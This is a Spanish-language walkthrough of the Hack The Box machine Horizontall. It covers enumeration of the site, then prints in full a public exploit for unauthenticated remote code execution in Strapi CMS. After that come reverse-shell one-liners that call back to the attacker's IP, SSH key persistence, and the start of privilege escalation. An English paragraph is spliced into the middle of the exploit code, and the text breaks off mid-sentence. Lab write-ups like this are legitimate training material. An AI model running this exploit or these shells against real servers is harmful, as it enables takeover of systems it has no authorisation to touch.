Muy buenas a todos hoy traere la máquina Easy de HTB llamada Horizontall

# SOBRE HORIZONTALL

Es una máquina Linux fácil, en los que encontraremos dos servicios expuestos "HHTP" y "SSH", deberemos enumerar la página y ver sobre que framework esta construida.

Nos fijaremos en el codigo fuente, el CMS que utiliza la CVE que utilizaremos, etc. Hasta encontrar Root.

# INICIO

Para empezar siempre se hacen dos cosas básicas si queremos tres.
1- Identificar el sistema operativo al que nos enfrentamos (en este caso Linux)
2- Comprobar que hay conectividad entre ambas máquinas
3- Hacer un escaneo de puertos.

Todo comprobado utilizaremos el comando que siempre suelo utilizar para escanear puertos.

```
sudo nmap -sCV -T4 --min-rate 1000 IP
```
Como vemos nos encontramos los dos típicos puertos 22 - ssh y 80 - http

Lo primero que haremos sera conectanor a dicha página web pero su dominio nos redirige a "horizontall.htb" con lo cual lo agregamos a nuestro DNS.

```
echo "10.10.11.105 horizontall.htb" | sudo tee -a /etc/hosts
```
Como podemos observar en la página no encontramos nada interesante, pero si nos vamos al apartado "Network" de nuestro navegador, podemos identificar varios archivos ".js" en los que no fijaremos y uno muy llamativo sobre la app 
"app.c68eb362.js" si nos vamos a dicho fichero, nos encontraremos un varullo de cosas, pero lo pasaremos por la maravillosa página "beautifier" 
```
methods: {
 getReviews: function() {
 var t = this;
 r.a.get("http://apiprod.horizontall.htb/reviews").then((function(s) {
 return t.reviews = s.data
 }
```
En la que nos encontramos un "VHOST" cual añadiremos a nuestro DNS.
```
echo "10.10.11.105 api-prod.horizontall.htb" | sudo tee -a /etc/hosts
```
Cuando la visitamos nos encontramos una página en blanco en la que pone "Welcome"

Probamos a mirar el código fuente pero en este caso no encontramos nada, con lo cual pasaremos a la siguiente forma de enumerar, que seran en este caso algun dominio, redireccion posible, utilizaremos en este caso gobuster.

En este caso posiblemente necesitaremos el repositorio famoso "seclist" tenemos dos formas de descargarlo, llendonos al github o la forma simple
```
sudo apt install seclist
```
y utilizamos el escaner
```
gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/seclists/Discovery/WebContent/raft-small-words.txt -o gobuster -t 50
```
Gracias a esto encontramos la redireccion "admin" y nos llevara a un logeo.

Nos encontramos con una página web que utiliza [strapi](https://strapi.io) es un open source que utiliza "node.js"

Podemos buscar vulnerabilidades de strapi, yo utilizare la herramienta "searchsploit"
```
searchsploit strapi
```
Para utilizar esta herramienta, dependeremos de la base de datos "exploit db" si queremos instalar esta funcion
```
sudo apt -y install exploitdb
```
Nos encontramos con unos cuantos exploits pero uuno nos llama la atención "3.0.0-beta.17.7" para vulnerar el CMS Strapi con (RCE), sin necesidad de autentificar, en el panel de administrador. Sin necesidad de sus credenciales y nos redirigue a este archivo " multiple/webapps/50239.py"

```
searchsploit -m 50239.py
```
```
# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE)
(Unauthenticated)
# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609
#!/usr/bin/env python3
import requests
import json
from cmd import Cmd
import sys
if len(sys.argv) != 2:
 print("[-] Wrong number of arguments provided")
 print("[*] Usage: python3 exploit.py <URL>\n")
 sys.exit()
class Terminal(Cmd):
 prompt = "$> "
 def default(self, args):
 code_exec(args)
def check_version():
 global url
 print("[+] Checking Strapi CMS Version running")
 version = requests.get(f"{url}/admin/init").text
 version = json.loads(version)
 version = version["data"]["strapiVersion"]
 if version == "3.0.0-beta.17.4":
 print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
 else:
 print("[-] Version mismatch trying the exploit anyway")
def password_reset():
 global url, jwt
 session = requests.session()
 params = {"code" : {"$gt":0},
 "password" : "SuperStrongPassword1",
 "passwordConfirmation" : "SuperStrongPassword1"
 }
 output = session.post(f"{url}/admin/auth/reset-password", json = params).text
 response = json.loads(output)
 jwt = response["jwt"]
 username = response["user"]["username"]
Inside the script there is a function called check_version() that makes a request to /admin/init to check
if the remote instance of Strapi is vulnerable to this exploit. We could visit this endpoint to verify manually if
we can use this exploit.
The version matches the one that the exploit needs to work so we can try executing the script to get a
reverse shell. From the source code we can see that it expects a URL parameter as input.
 email = response["user"]["email"]
 if "jwt" not in output:
 print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
 sys.exit(1)
 else:
 print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+]
Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON
Web Token: {jwt}\n\n")
def code_exec(cmd):
 global jwt, url
 print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't
expect to see output")
 headers = {"Authorization" : f"Bearer {jwt}"}
 data = {"plugin" : f"documentation && $({cmd})",
 "port" : "1337"}
 out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
 print(out.text)
if __name__ == ("__main__"):
 url = sys.argv[1]
 if url.endswith("/"):
 url = url[:-1]
 check_version()
 password_reset()
 terminal = Terminal()
 terminal.cmdloop()
```
Nos vamos a la ruta y probamos si el exploit funciona
```
python3 50239.py http://api-prod.horizontall.htb
```
Como podemos ver el RCE funciona correctamente pero tenemos una Shell llamada invisible porque no podemos ver nada de lo que hacemos, con lo cuál vamos a hacer una reverse shell para poder utilizarlo todo plenamente.
Para empezar nos ponemos en escucha en el puerto que queramos
```
sudo nc -lvnp 9001
```
y mandamos una revershe sell a dicha escucha desde la máquina victima
```
bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1
```
Esta no funciona probemos con otra
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 9001 >/tmp/f
```
Con esta estamos dentro. 
También darnos cuenta que nos han dado un token de autentificacion con el usuario y contraseña del panel de admin.
```
 admin:SuperStrongPassword1
```
## MOVIMIENTO LATERAL

```
script /dev/null -c bash
ctrl-z
stty raw -echo; fg
Enter 
```
Esto lo hacemos para tener una shell interactiva

Gracias a esto ya podemos sacar la primera flag la de usuario

Posteriormente al hacer un poco de recolecta de información sabemos que nuestras claves ssh se encunetran en al ruta "/opt/strapi/.shh/authorized_keys" 

Crearemos para empezar un .ssh para hacer un par de claves y posteriormente conectarnos por ssh

```
cd /opt/strapi
mkdir .ssh
ssh-keygen
```
Nos saldrán varias opciones para agregar texto pero simplemente en la primera opción elegimos strapi para que luego el output salga con ese nombre.

Y copiamos el contenido del fichero "strapi.pub" y nos conectamos por ssh

# ESCALACION DE PRIVILEGIOS

Hacemos un netstat para ver los servicios que corren en los puertos
```
netstat -pentul
```
Si vamos haciendo curls a los diferentes puertos encontraremos diferente información interesante.
Ahora si que vamos a utilizar bien el ssh, creamos desde nuestro ordenador principal unas keys como anteirormente y las llevamos a "autorized_ke
